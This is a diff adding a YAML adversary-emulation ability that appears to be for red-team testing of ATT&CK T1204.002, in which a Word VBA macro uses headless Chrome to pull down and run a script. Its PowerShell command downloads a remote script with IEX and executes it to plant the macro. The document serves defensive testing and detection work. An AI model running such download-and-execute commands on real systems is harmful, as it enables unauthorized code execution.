@@ -1,0 +1,29 @@
+---
+- id: 98adc43648b0e4ea6e90a88ad5ae4b3d
+  name: Headless Chrome code execution via VBA
+  description: 'This module uses Google Chrome combined with ScriptControl to achieve
+    code execution. It spawns a local
+
+    webserver hosting our malicious payload. Headless Google Chrome will then reach
+    out to this webserver
+
+    and pull down the script and execute it. By default the payload will execute calc.exe
+    on the system.
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt"
+          -officeProduct "Word" -sub "ExecChrome"'
+        payloads: []
+        cleanup: Stop-Process -name mshta
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
